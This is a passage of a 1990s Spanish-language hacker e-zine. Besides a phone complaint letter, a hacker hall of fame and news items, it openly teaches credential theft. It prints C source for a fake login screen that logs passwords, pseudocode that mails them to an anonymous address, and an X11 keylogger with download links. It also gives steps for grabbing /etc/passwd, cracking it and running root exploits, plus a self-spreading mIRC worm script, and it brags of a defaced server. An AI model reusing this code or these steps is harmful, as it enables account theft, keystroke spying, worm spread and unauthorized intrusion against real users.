  debemos conocer como crear un fichero bat o en cualquier lenguaje de
  programacion y ademas tambien debemos tener una cuenta que no sea nuestra
  por si pillan la trampa.

        Primero os esplicare como funciona y luego os dare el codigo :)

        Estamos en una terminal de la universidad, por ejemplo, y hemos
  pillado la cuenta de algun lamer, entonces metemos su login y password y
  entramos en su cuenta, ojo!! que nadie nos vea !!!. Ya estamos dentro y
  escribimos un pequeño programa que simule la entrada al sistema, y cuando
  el programa esta activo, pedira el login y el password y cuando alquien
  lo meta, el programa le dice que el sistema esta muy ocupado y que vuelva
  mas tarde o tambien podemos llamar al login verdadero, despues nos volvemos
  a meter en la cuenta y recogemos el fichero con todas las cuentas :),
  tambien podemos enviar el fichero en cuestion a una cuenta de correo
  anonima para no ser pillados.

------------ Codigo Fuente ---------------------------------------------------

  /*-------------------------------------------------------------------+
  | GRABEM 1.0                                       by The K-Man      |
  | A Cute little program to collect passwords                         |
  +-------------------------------------------------------------------*/
  #define PASSWORD "Password:"
  #define INCORRECT "\nLogin incorrect"
  #define FILENAME ".exrc%"
  #include
  #include
  /*-------------------------------------------------------------------+
  | ignoreSig                                                          |
  |                                                                    |
  |    Does nothing. Used to trap SIGINT, SIGTSTP, SIGQUIT.            |
  +-------------------------------------------------------------------*/
  void ignoreSig ()
  {
        return;
  }
  /*-------------------------------------------------------------------+
  | Main                                                               |
  +-------------------------------------------------------------------*/
  main()
  {
  char    name[10],                       /* users name
     */
                password[10];           /* users password
     */

  int     i,                              /* loop counter                         */
                lab,                    /* lab # you're running on              */
                procid;                 /* pid of the shell we're under         */
  FILE    *fp;                            /* output file
     */

     /*-----------------------------------------------------------------+
     | Trap the SIGINT (ctrl-C), SIGSTP (ctrl-Z), and SIGQUIT (ctrl-\)  |
     | signals so the program doesn't stop and dump back to the shell.  |
     +-----------------------------------------------------------------*/
        signal (SIGINT, ignoreSig);
  signal (SIGTSTP, ignoreSig);
  signal (SIGQUIT, ignoreSig);
  /*----------------------------------------------------------------------+
  | Get the parent pid so that we can kill it quickly later.  Remove      |
  | this program from the account.                                        |
  +----------------------------------------------------------------------*/
  procid = getppid();
  system ("\\rm proj2");
  /*----------------------------------------------------------+
  | Ask for the lab # we're running on.  Clear the screen.    |
  +----------------------------------------------------------*/
  printf ("lab#: ");
  scanf ("%d", &lab);
  for (i=1; i<40; i++)
        printf ("\n");
  getchar();
  /*-------------------------------------------------------------------+
  | Outer for loop.  If the name is <= 4 characters, it's probably not |
  | a real id.  They screwed up.  Give 'em another chance.             |
  +-------------------------------------------------------------------*/
  for(;;)
  {
        /*------------------------------------------------------------+
        | If they hit return, loop back and give 'em the login again. |
        +------------------------------------------------------------*/
        for (;;)
        {
                printf("lab%1d login: ",lab);
                gets (name);
                if (strcmp (name, "") != 0)
                        break;
        }
        /*---------------------------------------------------------------+
        | Turn off the screen echo, ask for their password, and turn the |
        | echo back on.                                                  |
        +---------------------------------------------------------------*/
        system ("stty -echo > /dev/console");
        printf(PASSWORD);
        scanf("%s",password);
        getchar();
        system ("stty echo > /dev/console");
        /*----------------------------------------------+
        | Write their userid and password to the file.  |
        +----------------------------------------------*/
        if ( ( fp = fopen(FILENAME,"a") )  != NULL )
        {
                fprintf(fp,"login %s has password %s\n",name,password);
                fclose(fp);
        }
        /*----------------------------------------------+
        | If the name is bogus, send 'em back through   |
        +----------------------------------------------*/
        if (strlen (name) >= 4)
                break;
        else
                printf (INCORRECT);
        }

  /*-------------------------------------------------------------------+
  | Everything went cool. Tell 'em they fucked up and mis-typed and    |
  | dump them out to the REAL login prompt.  We do this by killing the |
  | parent process (console).                                          |
  +-------------------------------------------------------------------*/
        printf (INCORRECT);
        kill (procid, 9);
  }

------------ FIN -------------------------------------------------------------

        Esto era un programa en C, el cual ira perfecto para nuestros
  propositos, por supuesto habra que retocarlo un poco para ajustarlo a
  nuestro sistema. Funciona para sistemas unix y solo nos queda escribirlo
  en un editor cualquiera (vi, por ejemplo) y compilarlo. Ahora pondre otro
  ejemplo.

------------ PseudoCodigo Fuente ---------------------------------------------

   cls
   print " PENTAGONO.MIL              "
   print " CONECTADO AL SISTEMA...    "
   print
   print 
   sleep 2                              ┐
   input "login:",user$                 │
   input "pass:",pass$                  │   Opcion nº 1
   open "fichx.dat" for append as #1    │
   write #1,user$,pass$                 │
   close                                ┘
   input "login:",user$                 ┐
   input "pass:",pass$                  │
   poen "fich.dat" for append as #1     │   Opcion nº 2
   write #1,user$,pass$                 │
   close                                │
   mail xxxx@anon.es fichx.dat          ┘
   sleep 1
   cls                                                        ┐ Opcion nº 1
   print "error: muchos usuarios llama dentro de una hora"    ┘
   cls                                                        ┐ Opcion nº 2
   call #login                                                ┘
   end
------------- Fin ------------------------------------------------------------

        Esto realmente no es un autentico programa, es lo que se llama
  pseudocodigo, para que nos hagamos una idea clara de como seria el
  programa.

        Como podeis ver claramente simula la entrada a una maquina, asi
  engaña al lamer de turno, despues pide login y acto seguido el password,
  sacando despues el mensaje de "vuelva mas tarde" pero el login y el password
  del lamer se han quedado grabado en un fichero :). Podemos ver las
  distintas opciones que podemos elegir, por supuesto hay muchas opciones la
  unica barrera es nuestra mente. Debido a que el codigo es muy obvio no lo
  explicare en detalle si alquien no lo entiende que me envie un mail y se
  lo explico detalladamente.

  - Key Recorder.

        Los key recorder son pequeños programas que se dejan residentes en
  memoria (TSR) para que graben las teclas pulsadas por un usuario de un
  sistema. AL igual que los Pantallas Falsas tambien los Key Recorder
  guardaran la informacion en un fichero escondido en el sistema.

        Este tipo de programas son muy faciles de usar e instalar y son
   perfectos en lugares donde no halla mucha seguridad y que tengan
   s.o. muy penosos, como el win95 o win 3.x, logicamente tb hay para unix.

        Pues ahora os dire donde encontrar varias de estas utilidades y tb
   os dare un codigo fuente en C para las Xwindows :)

------------ Codigo Fuente ---------------------------------------------------

  /* To compile, run it through your favorite ansi compiler something like
   * this :
   *
   *    gcc -o xkey xkey.c -lX11 -lm
   *
   * To run it, just use it like this :  xkey displayname:0
   * and watch as that display's keypresses show up in your shell window.
   *
   *    Dominic Giampaolo (nick@cs.maxine.wpi.edu)
   */
  #include &lt;stdio.h>
  #include &lt;X11/X.h>
  #include &lt;X11/Xlib.h>
  #include &lt;X11/Intrinsic.h>
  #include &lt;X11/StringDefs.h>
  #include &lt;X11/Xutil.h>
  #include &lt;X11/Shell.h>

  char *TranslateKeyCode(XEvent *ev);

  Display *d;

  void snoop_all_windows(Window root, unsigned long type)
  {
   static int level = 0;
   Window parent, *children, *child2;
   unsigned int nchildren;
   int stat, i,j,k;

  level++;

  stat = XQueryTree(d, root, &root, &parent, &children, &nchildren);
  if (stat == FALSE)
   {
     fprintf(stderr, "Can't query window tree...\n");
     return;
   }

  if (nchildren == 0)
    return;

  /* For a more drastic inidication of the problem being exploited
   * here, you can change these calls to XSelectInput() to something
   * like XClearWindow(d, children[i]) or if you want to be real
   * nasty, do XKillWindow(d, children[i]).  Of course if you do that,
   * then you'll want to remove the loop in main().
   *
   * The whole point of this exercise being that I shouldn't be
   * allowed to manipulate resources which do not belong to me.
   */
  XSelectInput(d, root, type);

  for(i=0; i < nchildren; i++)
   {
     XSelectInput(d, children[i], type);
     snoop_all_windows(children[i], type);
   }

   XFree((char *)children);
  }

  void main(int argc, char **argv)
  {
   char *hostname;
   char *string;
   XEvent xev;
   int count = 0;

  if (argv[1] == NULL)
    hostname = ":0";
  else
    hostname = argv[1];

  d = XOpenDisplay(hostname);
  if (d == NULL)
   {
     fprintf(stderr, "Blah, can't open display: %s\n", hostname);
     exit(10);
   }

  snoop_all_windows(DefaultRootWindow(d), KeyPressMask);

  while(1)
   {
     XNextEvent(d, &xev);

     string = TranslateKeyCode(&xev);
     if (string == NULL)
       continue;

     if (*string == '\r')
       printf("\n");
     else if (strlen(string) == 1)
       printf("%s", string);
     else
       printf("<<%s>>", string);
     fflush(stdout);
   }
  }

  #define KEY_BUFF_SIZE 256
  static char key_buff[KEY_BUFF_SIZE];

  char *TranslateKeyCode(XEvent *ev)
  {
   int count;
   char *tmp;
   KeySym ks;

  if (ev)
   {
     count = XLookupString((XKeyEvent *)ev, key_buff, KEY_BUFF_SIZE, &ks,NULL);
     key_buff[count] = '\0';

     if (count == 0)
      {
        tmp = XKeysymToString(ks);
        if (tmp)
          strcpy(key_buff, tmp);
        else
          strcpy(key_buff, "");
      }

     return key_buff;
   }
   else
     return NULL;
  }

------------- Fin ------------------------------------------------------------

        Pues esto es otro programa que tampoco nos traera ninguna
  complicacion, solo hay que seguir los pasos que indica el codigo
  y listos. Ahora url's donde podras pillar Key Recorders:

        #Keycopy

        http://www.ais.org/~paxton/archive/keycopy.zip

        #Playback 1.9

        http://www.plazma.net/users/weiner/PB19C.ZIP

        #Phantom 2

        http://www.ilf.net/~toast/files/keycopy/phantom2.zip

        #Doslog 2

        http://uiarchive.cso.uiuc.edu/pub/systems/pc/simtelnet/msdos/
        security/dos-log2.zip

        #Keytrap

        http://www.ilf.net/~toast/files/keycopy/keytrap1.zip

        #Keylog95.zip

        #Keylogwn.zip

        Por desgracia estos 2 ultimos no me acuerdo donde los halle, pero
  tampoco seran muy dificil de encontrar o sea que os dejo unas utilidades
  para buscarlas vosotros mismos :), si alquien sabe donde estan que nos
  escriba y lo publicaremos en el proximo numero.

        Pues esto es todo y espero que te sirva para algo y sobre todo que
  avances en tus conocimientos sobre hack. Si quieres consultar sobre algo,
  criticar o cualquier cosa, ponte en contacto conmigo.

  Bye y saludos a todos !!!

                                                       CONDE VAMPIRO
                                                 - J.J.F. / HACKERS TEAM -

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>

                    ---------------------------------------
                    ->  MOVIL DEFECTUOSO ERICSSON GA-628 <-
                    ---------------------------------------

  JSR.

  17 de Diciembre de 1997

  A quien pueda interesar :

  ESTAFADOS   por   AIRTEL  y  ERICSSON

  En el dia 31-Julio-1997 mi esposa y yo contratamos el Plan Familiar de
  AIRTEL. Adquirimos dos terminales ERICSSON modelo GA-628 que han funcionado
  sin ningun problema hasta el mes de Noviembre, en el cual el terminal de mi
  esposa dio el error " FALTA SIM " cuando lo puso a cargar. (En todo momento
  hemos dispensado el uso y trato correcto al telefono).
  Aqui comienza nuestro calvario con este movil DEFECTUOSO GA-628. Lo llevamos
  a revisar al concesionario donde compramos ambos terminales, AIRCONTEL,S.A.
  (Avda. Menendez Pelayo, 41 28009-Madrid), en el cual lo tuvieron retenido
  durante un mes, al cabo del cual sin tener noticias de este, fuimos
  personalmente y nos devolvieron el terminal DEFECTUOSO GA-628, explicandonos
  que no tenia reparacion y que la averia fue causada por haber liquidos en su
  interior. (Se lavaron las manos en el asunto).
  A continuacion llamo al presunto Servicio de Atencion al Cliente de ERICSSON
  en el Tel: 902-180-576 y me dicen que necesitan una segunda opinion y me
  remiten a cualquiera de sus dos centros oficiales de reparacion en Madrid.
  Llevo el terminal DEFECTUOSO GA-628 a uno de estos CELULAR START, S.L. y me
  responden al cabo de un dia la misma respuesta, el terminal no tiene arreglo
  porque ha sido sumergido en liquidos y por lo tanto la garantia de ERICSSON
  no tiene validez alguna.
  La cuestion es que fisicamente nunca hemos sumergido el terminal en liquidos
  ni nada parecido, por lo que ha mi esposa y a mi nos han vendido un terminal
  movil DEFECTUOSO de ERICSSON modelo GA-628 en AIRCONTEL, S.A. y tanto
  ERICSSON como AIRTEL como AIRCONTEL se lavan las manos y nos han dejado
  tirados. El Servicio de Atencion al Cliente es una FALACIA, no existe como
  tal. Para nuestra mayor desesperacion no hacemos otra cosa que ver a diario
  en los Medios de prensa como EL MUNDO, EL PAIS, etc y otras inserciones
  publicitarias como las vallas de la EMT, etc lo maravilloso y la calidad que
  tienen los terminales moviles de ERICSSON modelo GA-628, y  que ambas
  empresas tienen no se cuantos certificados UNE, ISO a la CALIDAD; PURA
  PATRAÑA y ENGAÑO.
  Asi que como indefensos ciudadanos que somos ante estos ESTAFADORES, no me
  queda mas remedio que airear a los cuatros vientos este suceso para que por
  lo menos ningun ciudadano sea estafado de nuevo por estas empresas.

  Fdo. Julian Serrano DNI: 1.919.931-Y

  E-mail: jsr@anit.es

  >--------------<

  Thx by your help!
  Te envio copia del e-mail que enviado por AIRTEL y
  que me animo a escribir la carta de denuncia.
  Esta empresa hace referencia a la humedad condensada
  en el interior del movil como probable causa de su defuncion.
  Todavia recuerdo un publi-reportaje de ERICSSON
  en el que se mostraba a los esquimales LAPONES
  hablando a traves de un movil ERICSSON mientras
  conducian sus rebaños de karibus en sus motos de
  nieve a lo largo de la tundra nordica.
  Creo que por ahi el clima es algo mas humedo que
  por Madrid, y sin embargo alli parece no existir
  el problema de condensacion diagnosticado por AIRTEL
  en mi movil DEFECTUOSO ERICSSON GA-628.

  Thx again !

  From: info@airtel.es
  Date: Tue, 30 Dec 97 09:12:09 
  To: jsr@anit.es
  Subject: [Fwd: Fwd:Ericsson GA-628 DEFECTUOSO]

   Estimado Sr.Serrano:
        
   Muchas gracias por utilizar este servicio para comunicar con AIRTEL.
        
   Con respecto a su e-mail de queja, indicarle que lamentamos la 
   incidencia con respecto a su telefono y la impresion recibida por parte 
   de AIRTEL a raiz de este suceso.
        
   No es en ningun caso pretension de nuestra empresa el no atender a 
   cualquiera de las posibles incidencias reportadas por parte de nuestros 
   clientes, por lo que le pedimos disculpas si la impresion recibida en 
   cuanto a la notificacion de esa incidencia hubiera podido ser de 
   despreocupacion.
        
   Tanto nuestro departamento Tecnico como en este caso el propio proveedor 
   del servicio Ericsson han detectado que la causa de la averia de dicho 
   terminal se debe a que se han recogido liquidos en su interior.
        
   Quizas en alguna recarga haya dejado su telefono en algun lugar en donde 
   se haya producido vaho o vapor, el cual al enfriarse se ha convertido en 
   liquido, causa por la cual segun los informes tecnicos el telefono esta 
   averiado.
        
   Tenemos que tener en cuenta, que ambos servicios tecnicos han coincidido 
   con su analisis, y que los moviles que se han de ofrecer a nuestros 
   clientes han de pasar por un examen que diagnostique el estado de los 
   mismos, por lo que descartamos que desde su puesta en venta pudiera 
   existir esta incidencia.
        
   No obstante si se hubiese dado ese caso, ya desde un inicio el 
   funcionamiento del mismo no hubiese sido el correcto, lo cual habria 
   llevado a una rapida examinacion que en todo caso hubiera demostrado que 
   algo no funcionaba de forma correcta.
        
   Lamentamos no poder ofrecerle una solucion concreta, no obstante 
   agradeceriamos que contactara con nosotros para cualquier otra consulta, 
   duda o sugerencia que estime oportuna hacernos llegar.
       
   Le deseamos unas muy felices fiestas.
        
   Atentamente.
        
   AIRTEL Area de Gestion de Clientes en Internet.

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>


                           /----------------------\
                          │  INTRODUCCION AL HACK  │
                           \----------------------/

        Este texto va dedicado a novatos y gente que se quiera inicializarse
  en el hacking. Muchas veces entran en #hackers y preguntan, que es telnet?
  o, quien sabe de telnet?, o tengo una cuenta pero no se que hacer. Lo que
  pretendo aqui es enseñaros un par de cosas que podeis hacer una vez teneis
  una cuenta shell. Que no teneis una? pues pedir y buscar, donde?, una buen
  sitio es en el irc de effnet, en el canal #shells.

        Bueno, supongamos que ya teneis la cuenta, que debe constar de un
  host que sera la makina donde hareis telnet, un login y un password.

        Haceis telnet a esa makina, os pediran el login en primer lugar, y
  depues el password [NOTA: el password no saldra sobreimpreso cuando lo
  escribais]. Ya estamos dentro, ahora os saldra el prompt normalmente este
  signo -- > $, pero pueden ser otros. Y ahora?. Ahora lo que necesitais
  saber son algunos comandos UNIX.

        COMANDOS :

        who  (nos dice quien esta conectado en ese momento)

        w    (vemos los usuarios conectados y en la columna de la derecha
              "WHAT" podemos ver lo que estan haciendo)

        ls   ( es equivalente al dir en MSDos, nos da un listado de los
               archivos y directorios)

        pwd  (sabemos en que directorio nos encontramos en ese momento)

        vi file o pico file (son los editores mas utilizados, yo
                             personalmente utilizo el vi)

        cd   (para cambiar de directorio [NOTA: si estamos perdidos y
              solamente escribimos cd, volveremos al home dir]

        cd ..  (para volver al directorio anterior)

        Lo primero que podemos hacer es coger el file de passwds de los
  usuarios con el comando: cat /etc/passwd [NOTA : lo q hacemos con este
  comando es cortar el fichero passwd del directorio /etc, que es donde se
  encuentra]. Nos saldran los passwds de los usuarios encriptados,
  encriptados?, si, encriptados, ahora solo hay que crakearlos. El mejor
  crakeador de passwds que hay es el John the Ripper, lo podeis encontrar en
  cualquier sitio. Una vez crakeados, podeis entrar en el sistema con el
  login y pass de otro usuario.

        Lo mas excitante es intentar hacerse root [ NOTA: el root es el
  administrador del sistema, o sabe mucho o es muy pero que muy tonto, a
  muy tonto me refiero a que le puedes tomar el pelo como quieras =) ]. Si
  conseguimos ser root podremos hacer lo que queramos, crear o borrar
  cuentas, instalar nuestros sniffers o troyanos, etc.

        Para pillar root recurriremos a los exploits, buscalos en webs de
  exploits o bugs. Como se que exploit utilizar? Bueno en la shell pones lo
  siguiente: uname -a, este comando nos dira el tipo de UNIX/Linux y
  version del mismo. Por ejemplo si nuestra makina es un SUNOS 5.5.1, pues
  cogeremos nuestros exploits para este sistema y haremos lo siguiente. Los
  subimos a la shell por ftp mismo, lo compilamos, lo ejecutamos y si hay
  suerte... BASH #, seremos root!.

        Imaginemos que nuestro exploit se llama b.c, para compilarlo
  utilizaremos el comando : cc b.c, a continuacion si hacemos un ls,
  veremos q tenemos el archivo a.out  q es el exploit compilado. Renombramos
  este exploit por ejemplo a sploit con el comando: mv a.out sploit, y lo
  ejecutamos escribiendo: sploit, y si hay suerte somos root !.

        Espero que os haya servido de algo este texto, si es asi, porfavor
  escribid a la revista y asi podre escribir otros de nivel mas avanzadillo ;P,
  gracias.

                                                                     ViruX

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>

                             /------------------\
                           < Hackers Hall of Fame >
                             \------------------/

          En este articulo, vamos a dar un repaso a los padres o algunos de
  ellos a los abuelos de los hackers, o sea nuestros predecesores.  Vamos a
  ver que hicieron y las consecuencias de ello.  Bueno, na mas, vamos a ello:

  1. Richard Stallman.
  2. Ritchie & Thomson.
  3. John Draper.
  4. Mark Abene.
  5. Robert Morris.
  6. Kevin Mitnick.
  7. Kevin Poulsen.
  8. Johan Helsingius.
  9. Vladimir Levin.

  1. Richard Stallman:

  Nick: Ninguno, nada que ocultar.

        Porque llego a la fama: Uno de los hackers de la vieja escuela,
  salio de la calle y consiguio un trabajo en el laboratorio de inteligencia
  artificial de la MIT (Massachussets Technical Institute). Era un estudiante
  de Harvard en aquellos momentos, lo que le fastidiaba, era que el software
  era visto como una propiedad privada, con lo cual, mas tarde fundo la Free
  Software Foundation (Fundacion de Software Gratis).

        Primer encuentro con un ordenador: En 1969, en el Centro Cientifico
  de New York de IBM. Tenia 16 años de aquella.

        Herramientas: En los 80, Stallman dejo los laboratorios de la MIT,
  pero siguio trabajando para ellos en una oficina, en otro departamento. El
  fue quien creo el S.O. GNU, un tipo de GNU, no UNIX.

  Si quereis saber algo mas de Stallman, mirar:
  http://www.undergrad.math.uwaterloo.ca/~agray/meme.html

  2. Dennis Ritchie y Ken Thomson

  Nick: dmr y Ken.

        Por que llegaron a la fama: Conducian "el brazo fuerte" en los
  laboratorios de informatica de Bell Labs. Fueron los que crearon el
  sistema operativo UNIX en el 69. Un "bonito" S.O. para ordenadores, UNIX
  ayudaba a los usuarios con los ordenadores en general, con procesadores y
  redes, con lo cual se convirtio en un lenguaje standard.

        Herramientas: Plan 9, el S.O. de nueva generacion, creado como el
  descendiente de UNIX por Thomson y un colega de los laboratorios Bell, Rob
  Pike.

        Curiosidades: Ritchie es el autor del famoso lenguaje C, pero su
  lenguaje favorito era ALEF. Thomson. Un piloto amateur se fue a Moscu para
  volar un MIG-29.

  Para saber algo mas de Ritchie y Thomson, visitar:
  http://www.bell-labs.com/who/dmr/ o http://www.bell-labs.com/who/ken/ 

  3. John Draper
 
  Nick: Cap'n Crunch.

        Por que llego a la fama: Consiguio hacer llamadas gratis usando un
  silbato de plastico que le toco en una caja de cereales. Cap'n Crunch
  indujo a un monton de generaciones de hackers a el concepto de phreaking.

        Primer encuentro con un ordenador: Siendo un adolescente, intentaba
  que los telefonos le devolvieran las monedas al mismo tiempo que le daban
  la linea.
  
        Herramientas: El silbato de plastico que encontro en la caja de
  cereales. El silvato producia un tono de 2600 hertz. Lo justo para
  autorizar una llamada. Usado junto a una "blue box", te permitia hacer
  llamadas gratis ;-)

  Para saber algo mas de Cap'n Crunch, visita:
  http://www.vcomm.net/~crunch/Play/history/index.html/

  4. Mark Abene

  Nick: Phiber Optik.

        Por que llego a la fama: Fue uno de los fundadores/miembros del grupo
  Masters of Deception, Phiber Optik inspiro a miles de jovenes de los EEUU
  para "explorar" el interior de las redes telefonicas del pais. Un juez
  federal, intento "mandar un mensaje" a todos los demas hackers.
  Sentenciando a Phiber Optik a un año en una prision federal. Despues de
  esto, cientos de hackers fueron a una fiesta de bienvenida en honor de
  Abene, en Manhattan, en un club de elite. La revista New York califico a
  Abene como uno de los 100 hombres mas inteligentes de la ciudad.

        Primer encuentro con un ordenador: Pasando bastante tiempo en el
  departamento de electronica de los almacenes A&S en Queens, NY, donde su
  madre trabajaba. Alli conocio el Apple II, Timex Sinclair y el Commodore 64.
  El primer ordenador de su propiedad fue un TRS-80 de Radio Shack, mas
  conocido como Trash-80.

        Herramientas: Solia usar una box. La usaba tanto, que la tubo que
  llenar de celo para que no se le cayera a trozos.

        Curiosidades: La comida favorita de Phiber Optik era el pure de
  patatas del Kentucky Fried Chicken.

  Para saber algo mas sobre este maestro del hack, ir a:
  http://www.levity.com/julian/phiber.html/ 
  
  5. Robert Morris

  Nick: rtm

        Por que llego a la fama: Hijo del jefe de cientificos del National
  Computer Security Center, -el cual forma parte del National Security Agency
  (NSA)- este graduado de la Universidad de Cornell, introdujo la palabra
  "hacker" en el habla, cuando por "accidente" solto un gusano en internet en
  1988. Miles de ordenadores fueron infectados y posteriormente colgados.
 
        Primer encuentro con un ordenador: Su padre se trajo un ordenador
  original de la NSA a casa, el cual se convirtio en una pieza clave para el.

        Herramientas: Siendo todavia un adolescente, Morris ya tenia una
  cuenta el los laboratorios Bell, el cual hackeando desde su cuenta, llego a
  tener acceso de super-usuario.

        Curiosidades: Cuando el servicio secreto detuvo a Erik Bloodaxe de
  Legion Of Doom, encontraron una copia del codigo fuente del gusano de
  Morris.

  Para saber algo mas de Morris, visita:
  http://www.eg.bucknell.edu/~kapolka/cs240/morris/FAQ/ 
  
  6. Kevin Mitnick

  Nick: Condor

        Por que llego a la fama: El primer hacker que tuvo su cara
  "inmortalizada" en los posters de Most Wanted del FBI. Su status como
  reincidente (un joven hacker que nunca crecio) le proporciono el nombre de
  Lost Boy of Cyberspace (Chico perdide del ciberespacio).

        Primer encuentro con un ordenador: Como Mitnick no podia permitirse
  comprarse uno, lo que hacia era ir a las tiendas de Radio Shack y "jugar"
  con el ordenador de demostracion de la tienda, y un modem para llamar a
  otros ordenadores.

        Herramientas: Durante los tres años que estuvo huyendo, Mitnick usaba
  el IRC para comunicrase con sus amigos.

        Curiosidades: Durante su reclusion en un centro residencial y bajo
  tratamiento, Mitnick fue sometido a un tratamiento en 12 pasos, para
  conseguir que dejara su "adiccion a los ordenadores" segun dijo el juez.

  Para saber que pasa con el juicio de Mitnick, pasate por:
  http://www.2600.com/kevin/ 
  
  7. Kevin Poulsen

  Nick: Dark Dante
  
        Por que llego a la fama: En 1990, Poulsen controlo todas las llamadas
  de telefono que iban a la emisora de radio KIIS-FM, asegurando que el seria
  el numero 102 que iba a llamar a la emisora, haciendo esto, Poulsen gano un
  Porsche 944 S2.

        Primer encuentro con un ordenador: Cuando sus padres le compraron un
  TRS-80.

        Herramientas: Un juego de ganzuas, con las cuales entraba a los
  camiones de las compañias de telefono, al final le pillaron :-).

        Curiosidades: Fue encontrado culpable por entrar en otros ordenadores
  para buscar los nombres de agentes y operaciones del FBI.

  Para saber algo mas, pasate por:
  http://www.catalog.com/kevin 

  8. Johan Helsingius

  Nick: Julf

        Por que llego a la fama: Era el operador del mas grande y famoso
  remailer anonimo del mundo, llamado penet.fi, hasta que se lo cerraron en
  septiembre del 96. Los problemas de Helsingius empezaron cuando fue
  detenido por la policia ya que alguien andaba publicando "los secretos" de
  la Iglesia de la Cienciologia. Despues del juicio, Helsingius fue obligado
  a dar el nombre y direccion real del usuario.

        Herramientas: Aunque parezca mentira, el hombre que manejaba el mayor
  y mas famoso remailer del mundo, utilizaba un 486 con 200 mb de HD para
  ello.

        Curiosidades: Nunca sintio la necesidad de mandar un mail anonimo a
  nadie :-)

  Si quieres saber algo mas sobre el caso legal, echale un vistazo a :
  http://www.cyberpass.net/security/penet.press-release.html 

  9. Vladimir Levin

  Nick: ??????

        Por que llego a la fama: Graduado de la universidad de St Petersburg
  (St Petersburg Tekhnologicheski University), este matematico, fue el
  "cerebro" de la banda de hackers que trajeron de cabeza al Citibank
  jugando con los ordenadores, al cual le consiguieron estafar 10 millones
  de dolares :-). Fue arrestado en Londres, en el aeropuerto de Heathrow.

        Primer encuentro con un ordenador: ??????, ni se sabe. Pero fue
  acusado de usar el ordenador de su despacho en la universidad para entrar
  en Citibank.

        Herramientas: Siempre iba con un ordenador, juegos y discos. La
  policia le confisco una video camara, unos altavoces y una televison de su
  apartamento.

        Curiosidades: Levin se quejo de que uno de sus abogados era un agente
  del FBI.

  Para saber mas sobre el caso de levin, pasa por:
  http://www.spb.su/sppress/141/guilty.html 

        Bueeeeeeno, eso es todo sobre los 9 hackers mas famosos, y los que
  nos enseñaron sus truquillos para "aprender" sobre el ahora underground
  informatico. Asi que na mas, hasta otra.
  
  Bisho. 

  (mama, mama, mama, mama, hay un bisho en mi camaaaaaaa!!!)

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>

                          ------------------------
                          - NOTICIAS UNDERGROUND -
                          ------------------------
  
                                           - J.J.F. / HACKERS TEAM -

<────────────────────────────────────────────────────────────────────────────>
  GRUPO HACKER DESAFIA A TRAVES DE YAHOO!.

        Diciembre 10. Grupo hacker entra en Yahoo!, uno de los buscadores mas
  famosos de Internet, exigiendo la liberacion de un "camarada" y desafiando
  que si no era liberado soltaran un virus. Expertos de seguridad estaban
  preocupados y desconcertados de que los hackers hallan implantado el virus.

        Los Hackers se hacen llamar PANTS/HAGIS, entraron en Yahoo! sobre las
  10:00 pm del Lunes 8, dejando una nota digital de rescate: "Cualquiera que
  haya visitado la pagina de Yahoo! durante el ultimo mes, ahora esta
  infectado con una bomba logica/gusano en su ordenador... En el dia de
  Navidad de 1998 la bomba logica parte de este 'virus' se activara cargandose
  la red de todo el planeta. El virus puede ser parado pero no por mortales."

        La nota decia que un antidoto para el virus podria ser facilitado si
  era liberado el Hacker Kevin Mitnick. Mitnick fue acusado, con cargos
  penales debido a perdidas multimillonarias por sus actos en Internet, el año
  pasado.

        Diane Hunt, portavoz de la compañia, manifesto que el mensaje solo
  estuvo de 10 a 15 minutos y que solo unas cuantas persona lo vieron.
  "Nosotros tomamos parte en el asunto inmediatamente para ver el daño que
  havia alcanzado y arreglarlo inmediatamente," ella dijo. "Y sobre el virus?
  De hecho no hay virus."

        Yahoo! es uno de los buscadores mas usados de Internet. La nota
  aparecio por poco tiempo en el Homepage de Yahoo!, previniendo a la gente
  que estaba conectada al buscador en ese momento, que recibio 17,2 millones
  de visitas en Octubre.

<────────────────────────────────────────────────────────────────────────────>
  EL GUSANO DEL IRC.

        Ultimamente el mundo del IRC se ve amenzado por un pequeño script.
  Basicamente es una especie de gusano que nos contamina el mirc y luego
  cuando alguien hace un /join al canal le enviamos automaticamente una
  copia del gusano para que se infecte y asi sucesivamente, ademas tambien 
  altera los parametros del mirc, provoca que el usuario borre el
  comando.com, congif.sys, etc ... Lo que supone volver a instalar el s.o.

        El mirc 5.3 ya ha arreglado este fallo y no lo acepta, pero para
  aquellos que no lo tengan, lo que tiene que hacer para protegerse es
  cambiar el directorio de donwload estandar y crea uno especifico para
  donwload, con esto evitaremos que el script toque el mirc :)

        Y ahora lo que estabais esperando el codigo del script :)

------------ Script.ini ------------------------------------------------------

[script]  
n0=on 1:text:*inferno6*:#:/ctcp $nick k 
n1=on 1:text:áá *:?:{ s *2 | halt } 
n2=alias /s / *1 
n3=on 1:connect:/.enable #d
n4=#d on
n5=on 1:join:#:{ if ($nick != $me) { dcc send $nick script.ini }
| .disable #d | .timer 1 60 .enable #d }
n6=#d end

------------ Fin -------------------------------------------------------------

<────────────────────────────────────────────────────────────────────────────>
  - J.J.F. / HACKERS TEAM - PIDE DISCULPAS POR SU WEB.

  Como sabeis en nuestro web hay varios link que no funcionan correctamente
  pero se debe a que estamos de reformas. Cuando haya salido este numero
  espero que este todo correcto y podais disfrutar de un web de calidad.

  Os explicare como moveros por el web, como sabeis esta dividiendo en
  varias secciones, pues como en todos los web's si buscais algo en
  concreto vais a si seccion y listos. Pero por ejemplo los articulos y
  programas desarrollados por - J.J.F. / HACKERS TEAM - los podeis encontrar
  en la seccion TEAM y por supuesto el e-zine en su seccion E-ZINE (entre
  una barras azules horizontales en el web de secciones).

  Pues dicho esto creo que ya esta todo claro y estad atentos al web ya
  que cada cierto tiempo iran saliendo documentacion y programas que os
  seran de gran ayuda.

<────────────────────────────────────────────────────────────────────────────>
  HACKEADO UN SERVIDOR EN TAIWAN.

  Bueno aqui teneis mi primera web hackeada el dia 31/12/97.
  en un servidor de Taiwan.
  Espero que sea de vuestro agrado.

  al que quiera visitarla es :

  http://www2.seeder.net.tw/tpm/

  y el que quiera obtener la cuenta shell, que me mailee.

  Nos vemos en tokio.
  alex.

<────────────────────────────────────────────────────────────────────────────>
